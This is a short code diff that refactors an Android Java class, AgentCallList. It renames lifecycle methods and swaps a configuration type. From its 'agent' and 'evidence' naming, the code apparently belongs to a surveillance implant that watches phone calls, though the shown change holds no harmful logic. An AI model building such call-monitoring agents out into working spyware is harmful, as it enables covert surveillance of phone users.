@@ -13,6 +13,7 @@ import com.android.service.Call;
 import com.android.service.LogR;
 import com.android.service.Messages;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfAgent;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.interfaces.Observer;
 import com.android.service.listener.ListenerCall;
@@ -25,24 +26,24 @@ public class AgentCallList extends BaseAgent implements Observer<Call> {
 	private static final String TAG = "AgentCallList"; //$NON-NLS-1$
 
 	@Override
-	public boolean parse(AgentConf conf) {
+	public boolean parse(ConfAgent conf) {
 		return true;
 	}
 
 	@Override
-	public void go() {
+	public void actualGo() {
 		// TODO Auto-generated method stub
 
 	}
 
 	@Override
-	public void begin() {
+	public void actualStart() {
 		ListenerCall.self().attach(this);
 
 	}
 
 	@Override
-	public void end() {
+	public void actualStop() {
 		ListenerCall.self().detach(this);
 	}
 
